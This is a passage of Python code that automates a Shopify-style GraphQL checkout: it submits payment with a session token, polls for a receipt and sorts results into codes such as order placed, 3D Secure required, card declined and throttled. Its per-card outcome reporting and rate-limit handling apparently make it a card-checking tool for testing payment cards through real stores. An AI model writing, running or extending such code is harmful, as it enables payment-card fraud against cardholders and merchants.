                    "merchandise": submit_vars["merchandise"],
                    "payment": {
                        "totalAmount": {"any": True},
                        "paymentLines": [{
                            "paymentMethod": {"directPaymentMethod": {
                                "paymentMethodIdentifier": payment_identifier,
                                "sessionId": token,
                                "billingAddress": submit_vars["payment"][
                                    "billingAddress"],
                                "cardSource": None}},
                            "amount": {"any": True},
                            "dueAt": None,
                        }],
                        "billingAddress": submit_vars["payment"]["billingAddress"],
                    },
                    "buyerIdentity": submit_vars["buyerIdentity"],
                    "taxes": submit_vars["taxes"],
                    "tip": {"tipLines": []},
                    "note": {"message": None, "customAttributes": []},
                    "localizationExtension": {"fields": []},
                    "nonNegotiableTerms": None,
                    "optionalDuties": {"buyerRefusesDuties": False},
                },
                "attemptToken": attempt_token,
                "metafields": [],
                "analytics": {"requestUrl": checkout_url},
            },
            "operationName": "SubmitForCompletion",
        }

        try:
            resp = await session.post(graphql_url,
                                      params={"operationName": "SubmitForCompletion"},
                                      headers=gql_headers, json=body)
            data = json.loads(resp.text)
        except Exception as e:
            return _r("SUBMIT_FAILED", str(e)[:100], site_error=True)

        sst2 = (getattr(resp, "headers", {}) or {}).get(
            "x-checkout-one-session-token")
        if sst2:
            sst = sst2
            gql_headers["x-checkout-one-session-token"] = sst

        submitted = (data.get("data") or {}).get("submitForCompletion") or {}
        kind = submitted.get("__typename", "")
        if kind in ("SubmitSuccess", "SubmittedForCompletion"):
            receipt = submitted.get("receipt") or {}
            rtype = receipt.get("__typename") or receipt.get("status") or ""
            if rtype in ("ProcessedReceipt", "ORDER_PLACED", "SUCCESS"):
                return _r("ORDER_PLACED", "The order was placed",
                          product=product_title, price=total, charged=True)
            if rtype in ("ActionRequiredReceipt", "ACTION_REQUIRED"):
                return _r("3DS_REQUIRED", "The card needs a 3D Secure check",
                          product=product_title, price=total)
            if rtype in ("FailedReceipt", "FAILED"):
                pe = receipt.get("processingError") or {}
                said = _the_words(str(pe.get("code") or pe.get("message") or ""))
                return _r(said, str(pe.get("code") or pe.get("message") or "")[:110],
                          product=product_title, price=total)
            rid = receipt.get("id")
            if rid:
                for _ in range(6):
                    await asyncio.sleep(2)
                    try:
                        pr = await session.post(
                            graphql_url, params={"operationName": "PollForReceipt"},
                            headers=gql_headers,
                            json={"query": _GQL["poll"],
                                  "variables": {"receiptId": rid,
                                                "sessionToken": sst},
                                  "operationName": "PollForReceipt"})
                        pd = (json.loads(pr.text).get("data") or {}).get("receipt") or {}
                    except Exception:
                        break
                    ptype = pd.get("__typename") or pd.get("status") or ""
                    if ptype in ("ProcessedReceipt", "ORDER_PLACED"):
                        return _r("ORDER_PLACED", "The order was placed",
                                  product=product_title, price=total, charged=True)
                    if ptype in ("ActionRequiredReceipt", "ACTION_REQUIRED"):
                        return _r("3DS_REQUIRED",
                                  "The card needs a 3D Secure check",
                                  product=product_title, price=total)
                    if ptype in ("FailedReceipt", "FAILED"):
                        pe = pd.get("processingError") or {}
                        word = str(pe.get("code") or pe.get("message") or "")
                        said = _the_words(word)
                        return _r(said, _the_word_of_the_shop(word),
                                  product=product_title, price=total)
                    if ptype not in ("ProcessingReceipt", "WAITING"):
                        break
            return _r("CARD_DECLINED", "The order did not go through",
                      product=product_title, price=total)
        if kind == "SubmitFailed":
            reason = str(submitted.get("reason") or "")
            return _r(_the_words(reason), reason[:110], product=product_title,
                      price=total)
        if kind == "SubmitRejected":
            errs = submitted.get("errors") or []
            said = _the_words(json.dumps(errs)[:200])
            return _r(said, json.dumps(errs)[:110], product=product_title,
                      price=total)
        if kind == "Throttled":
            return _r("THROTTLED", "The store is rate limiting us",
                      site_error=True)
        if kind == "CheckpointDenied":
            return _r("CHECKPOINTDENIED", "The shop would not go on",
                      site_error=True)
        return _r("CARD_DECLINED", "The shop said %s" % (kind or "nothing"),
                  product=product_title, price=total)
    except Exception as e:
        return _r("SITE_ERROR", str(e)[:100], site_error=True)
    finally:
        try:
            await session.close()
        except Exception:
            pass
